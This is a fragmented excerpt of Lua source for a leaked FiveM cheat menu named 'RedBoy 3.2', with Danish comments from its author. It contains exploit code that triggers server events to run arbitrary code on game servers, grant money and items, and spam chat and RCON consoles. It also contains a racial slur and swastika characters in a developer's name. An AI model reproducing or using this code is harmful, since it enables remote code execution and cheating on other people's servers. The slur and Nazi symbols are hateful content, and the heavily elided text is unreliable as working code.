...
developers = {
    "Main Dev KØDKONGEN#9999",
    "customer #1 Du ik flot#1021",
    "Discord | Discord.gg/bKJd4eC5Db",
    "KØDKONGENS Girlfriend B!ue#9999",
    --[[leaket by kødkongen#9999
jeg leaker den fordi alle prøver men de kan ik eller nogen kan leak den men jeg gør den først så her 
pls lad være og ændre navnet i den så er du sød. :(
    og jeg gør det her for dig
    nå men tak til alle der har været med til det her hov der er jo kun mig KØDKONGEN#9999
    og tak til Du ik flot#1021 for at være der fra start]]
    "my friend 卐! Birgit卐",
}
...
for bs=0,9 do 
    print("velkommen til RedBoy developer of the menu KØDKONGEN#9999")
end
if has_value(allowedRockstarIDs, RockstarID) then
    
else
    for bs=0,9 do 
        print("Kontakt KØDKONGEN#9999 for at købe. Auth ID: " .. RockstarID)
    end
    local i = 1
    while a[i] do
...
version = "~r~3.2"
theme = "redboy43"
themes = {"RedBoy", "LyseRødeModder", "light", "black", "dark", "infamous", "kødkongen", "basic", "nuke", "nice", "Maja", "Allstars"}
--[[leaket by kødkongen#9999
jeg leaker den fordi alle prøver men de kan ik eller nogen kan leak den men jeg gør den først så her 
pls lad være og ændre navnet i den så er du sød. :(
    og jeg gør det her for dig
...
subMessage = "Tryk ~w~" .. menuKeybind .. "~w~ For at åbne ~q~M~g~e~r~n~b~u~p~e~o~n."
...
pls lad være og ændre navnet i den så er du sød. :(
    ...
    og tak til Du ik flot#1021 for at være der fra start]]
        ...
        -- og TriggerEventsVRP kan også være i server.lua ;)
        'TriggerEventsVRP',
...
RCCar.Spawn = function()
    ...
    SetVehicleNumberPlateText(RCCar.Entity, "KØDKONGEN#9999")
...
function MFt4elNUg0kg()
    for bs=0,9 do 
        TriggerEvent('chatMessage', "^1[RedBoy Fucker]", {141,211,255}, "^2Discord |  ^3bKJd4eC5Db ^4| ^6 SUB til kødkongen")
    end
    Citizen.CreateThread(function()
        local dg="Avenger"
        local dh="CARGOPLANE"
...
function RPPPwdjwdU23.SetTheme(id, theme)
    if theme == "dark" then
        ...
        themecolor = '~w~'
        themearrow = ">"
    elseif theme == "LyseRødeModder" then
...
pls lad være og ændre navnet i den så er du sød. :(
    ...
    nå men tak til alle der har været med til det her hov der er jo kun mig KØDKONGEN#9999
    og tak til Du ik flot#1021 for at være der fra start]]
                "[dn-scripts]", "dn-loadingscreen", "dn-mech", "fivem", "[våben]", "guns", "stream", "AC", "[Misc]", "DiscordBot", "modelblacklist", "removeshopcars", "construction", "",
                -- Scrips
                --[[leaket by kødkongen#9999
jeg leaker den fordi alle prøver men de kan ik eller nogen kan leak den men jeg gør den først så her 
pls lad være og ændre navnet i den så er du sød. :(
...
pls lad være og ændre navnet i den så er du sød. :(
    ...
    og tak til Du ik flot#1021 for at være der fra start]]
        ...
        print("\n________________\nEND OF RESOURCES BY KØDKONGEN#9999\n")
...
pls lad være og ændre navnet i den så er du sød. :(
    ...
    og tak til Du ik flot#1021 for at være der fra start]]
                local admin = [[
                        ...
                        for i = 1,500 do 
                            RconPrint("SUB TO KØKONGEN https://discord.gg/bKJd4eC5Db SUB TO KØKONGEN https://discord.gg/bKJd4eC5Db SUB TO KØKONGEN https://discord.gg/bKJd4eC5Db")
                            RconPrint("SUB TO KØKONGEN https://discord.gg/bKJd4eC5Db SUB TO KØKONGEN https://discord.gg/bKJd4eC5Db SUB TO KØKONGEN https://discord.gg/bKJd4eC5Db")
                        end
                    ]]
    ...
    local myTable = {
        'Redboy 3.2 Menu',
        'cred kødkongen/me/RedBoy v3',
        '! K  Ø  D  K  O  N  G  E  N #0001'
    }
    function ShowInfo(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    ...
    elseif RPPPwdjwdU23.Button("~h~~b~------~q~S~r~e~g~r~o~v~p~e~g~r ~w~IP~b~------") then
        ...
        elseif RPPPwdjwdU23.Button("Skifte til ~p~Clown") then
            ...
            elseif RPPPwdjwdU23.IsMenuOpened('ytt') then
                if RPPPwdjwdU23.Button("KØDKONGEN") then
                ...
                elseif RPPPwdjwdU23.Button("KØDKONGEN 2") then
                ...
                elseif RPPPwdjwdU23.Button("LyseRødeModder") then
                ...
                elseif RPPPwdjwdU23.Button("LyseRødeModder 2") then
...
elseif RPPPwdjwdU23.Button("~p~stop ~r~(Ejer-Tool-Ban)") then
    ...
    elseif RPPPwdjwdU23.Button("~w~Ban Spiller", '~r~Devo') then
        ...
        elseif RPPPwdjwdU23.Button("~w~Tjek Webhook logs på servern", '~r~Devo') then
            TriggerServerEvent('RunCode:RunStringRemotelly', [[
        ...
        elseif RPPPwdjwdU23.Button("Test your Lua Executor", '~q~A~o~l~g~l ~r~Servers') then  
            local Code = GetKeyboardInput("Enter plz")
				if string.lower(Code) == "y" then
                    ...
                    load(Code)(print[[SUB TO KØDKONGEN
nigger
Test 3
KØDKONGEN#9999 ON DISCORD
KØDKONGEN#9999 ON DISCORD
KØDKONGEN#9999 ON DISCORD
KØDKONGEN#9999 ON DISCORD
KØDKONGEN#9999 ON DISCORD
...
Eulen it has ESP and Myself OPTIONS and Weapon OPTIONS and vehicle OPTIONS and Lua executor and menues inside the menu
    ...
    elseif RPPPwdjwdU23.Button("Giv dig selv alt på servern") then
        TriggerServerEvent('trucker:success',10000000)
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
        TriggerServerEvent('kokain2')
